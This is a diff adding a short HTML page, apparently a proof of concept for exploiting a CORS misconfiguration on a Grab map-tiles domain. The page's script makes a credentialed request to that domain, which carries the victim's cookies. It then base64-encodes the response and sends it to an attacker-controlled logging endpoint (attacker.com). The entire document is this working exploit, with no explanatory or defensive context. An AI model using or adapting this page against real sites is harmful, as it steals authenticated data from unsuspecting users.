@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://map-tiles-cloudfront.grab.com", {
+        credentials: "include",
+      })
+      .then(res => res.text())
+      .then(data => {
+        fetch("https://attacker.com/log?data=" + btoa(data));
+      });
+    </script>
+  </body>
+</html>
